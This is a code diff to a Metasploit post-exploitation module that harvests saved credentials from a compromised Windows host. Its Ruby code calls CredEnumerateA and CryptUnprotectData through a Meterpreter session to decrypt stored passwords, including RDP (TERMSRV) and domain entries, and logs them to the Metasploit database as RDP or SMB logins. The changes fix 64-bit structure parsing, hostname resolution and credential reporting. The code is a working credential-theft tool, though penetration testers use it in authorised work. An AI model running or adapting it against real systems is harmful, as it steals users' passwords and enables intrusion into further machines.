@@ -1,12 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
@@ -29,15 +29,19 @@ class Metasploit3 < Msf::Post
   #RAILGUN HELPER FUNCTIONS
   ############################
   def is_86
-    pid = session.sys.process.open.pid
-    return session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    if @is_86_check.nil?
+      pid = session.sys.process.open.pid
+      @is_86_check = session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    end
+
+    @is_86_check
   end
 
   def pack_add(data)
     if is_86
       addr = [data].pack("V")
     else
-      addr = [data].pack("Q")
+      addr = [data].pack("Q<")
     end
     return addr
   end
@@ -95,7 +99,7 @@ class Metasploit3 < Msf::Post
       len,add = ret["pDataOut"].unpack("V2")
     else
       ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
-      len,add = ret["pDataOut"].unpack("Q2")
+      len,add = ret["pDataOut"].unpack("Q<2")
     end
 
     #get data, and return it
@@ -107,32 +111,11 @@ class Metasploit3 < Msf::Post
     #check for valid ip and return if it is
     return hostorip if Rex::Socket.dotted_ip?(hostorip)
 
-    #convert hostname to ip and return it
-    hostip = nil
-    if client.platform =~ /^x64/
-      size = 64
-      addrinfoinmem = 32
-    else
-      size = 32
-      addrinfoinmem = 24
-    end
-
     ## get IP for host
-    begin
-      vprint_status("Looking up IP for #{hostorip}")
-      result = client.railgun.ws2_32.getaddrinfo(hostorip, nil, nil, 4 )
-      if result['GetLastError'] == 11001
-        return nil
-      end
-      addrinfo = client.railgun.memread( result['ppResult'], size )
-      ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
-      sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
-      ip = sockaddr[4,4].unpack('N').first
-      hostip = Rex::Socket.addr_itoa(ip)
-    rescue ::Exception => e
-      print_error(e.to_s)
-    end
-    return hostip
+    vprint_status("Looking up IP for #{hostorip}")
+    result = client.net.resolve.resolve_host(hostorip)
+    return result[:ip] if result[:ip]
+    return nil if result[:ip].nil? or result[:ip].empty?
   end
 
   def report_db(cred)
@@ -143,9 +126,11 @@ class Metasploit3 < Msf::Post
       if cred["targetname"].include? "TERMSRV"
         host = cred["targetname"].gsub("TERMSRV/","")
         port = 3389
+        service = "rdp"
       elsif cred["type"] == 2
         host = cred["targetname"]
         port = 445
+        service = "smb"
       else
         return false
       end
@@ -153,23 +138,32 @@ class Metasploit3 < Msf::Post
       ip_add= gethost(host)
 
       unless ip_add.nil?
-        if session.db_record
-          source_id = session.db_record.id
-        else
-          source_id = nil
-        end
-        auth = {
-          :host => ip_add,
-          :port => port,
-          :user => cred["username"],
-          :pass => cred["password"],
-          :type => 'password',
-          :source_id => source_id,
-          :source_type => "exploit",
-          :active => true
+        service_data = {
+          address: ip_add,
+          port: port,
+          protocol: "tcp",
+          service_name: service,
+          workspace_id: myworkspace_id
         }
 
-        report_auth_info(auth)
+        credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          username: cred["username"],
+          private_data: cred["password"],
+          private_type: :password
+        }
+
+        credential_core = create_credential(credential_data.merge(service_data))
+
+        login_data = {
+          core: credential_core,
+          access_level: "User",
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        create_credential_login(login_data.merge(service_data))
         print_status("Credentials for #{ip_add} added to db")
       else
         return
@@ -184,43 +178,64 @@ class Metasploit3 < Msf::Post
     credentials = []
     #call credenumerate to get the ptr needed
     adv32 = session.railgun.advapi32
-    ret = adv32.CredEnumerateA(nil,0,4,4)
-    p_to_arr = ret["Credentials"].unpack("V")
-    arr_len = ret["Count"] * 4 if is_86
-    arr_len = ret["Count"] * 8 unless is_86
+    begin
+      ret = adv32.CredEnumerateA(nil,0,4,4)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("This module requires WinXP or higher")
+      print_error("CredEnumerateA() failed: #{e.class} #{e}")
+      ret = nil
+    end
+    if ret.nil?
+      count = 0
+      arr_len = 0
+    else
+      p_to_arr = ret["Credentials"].unpack("V")
+      if is_86
+        count = ret["Count"]
+        arr_len = count * 4
+      else
+        count = ret["Count"] & 0x00000000ffffffff
+        arr_len = count * 8
+      end
+    end
 
     #tell user what's going on
-    print_status("#{ret["Count"]} credentials found in the Credential Store")
+    print_status("#{count} credentials found in the Credential Store")
     return credentials unless arr_len > 0
-    if ret["Count"] > 0
+    if count > 0
       print_status("Decrypting each set of credentials, this may take a minute...")
 
       #read array of addresses as pointers to each structure
       raw = read_str(p_to_arr[0], arr_len, 2)
       pcred_array = raw.unpack("V*") if is_86
-      pcred_array = raw.unpack("Q*") unless is_86
+      pcred_array = raw.unpack("Q<*") unless is_86
 
       #loop through the addresses and read each credential structure
       pcred_array.each do |pcred|
         cred = {}
-        raw = read_str(pcred, 52,2)
-        cred_struct = raw.unpack("VVVVQVVVVVVV") if is_86
-        cred_struct = raw.unpack("VVQQQQQVVQQQ") unless is_86
+        if is_86
+          raw = read_str(pcred, 52, 2)
+        else
+          raw = read_str(pcred, 80, 2)
+        end
+
+        cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
+        cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
         cred["flags"] = cred_struct[0]
         cred["type"] = cred_struct[1]
-        cred["targetname"] = read_str(cred_struct[2],512, 1)
-        cred["comment"] = read_str(cred_struct[3],256, 1)
+        cred["targetname"] = read_str(cred_struct[2], 512, 1)
+        cred["comment"] = read_str(cred_struct[3], 256, 1)
         cred["lastdt"] = cred_struct[4]
         cred["persist"] = cred_struct[7]
         cred["attribcnt"] = cred_struct[8]
         cred["pattrib"] = cred_struct[9]
-        cred["targetalias"] = read_str(cred_struct[10],256, 1)
-        cred["username"] = read_str(cred_struct[11],513, 1)
+        cred["targetalias"] = read_str(cred_struct[10], 256, 1)
+        cred["username"] = read_str(cred_struct[11], 513, 1)
 
-        if cred["targetname"].include? "TERMSRV"
-          cred["password"] = read_str(cred_struct[6],cred_struct[5],0)
+        if cred["targetname"].include?('TERMSRV')
+          cred["password"] = read_str(cred_struct[6], cred_struct[5], 0)
         elsif cred["type"] == 1
-          decrypted = decrypt_blob(cred_struct[6],cred_struct[5], 1)
+          decrypted = decrypt_blob(cred_struct[6], cred_struct[5], 1)
           cred["username"] = decrypted.split(':')[0] || "No Data"
           cred["password"] = decrypted.split(':')[1] || "No Data"
         elsif cred["type"] == 4
@@ -228,6 +243,7 @@ class Metasploit3 < Msf::Post
         else
           cred["password"] = "unsupported type"
         end
+
         #only add to array if there is a target name
         unless cred["targetname"] == "Error Decrypting" or cred["password"] == "unsupported type"
           print_status("Credential sucessfully decrypted for: #{cred["targetname"]}")
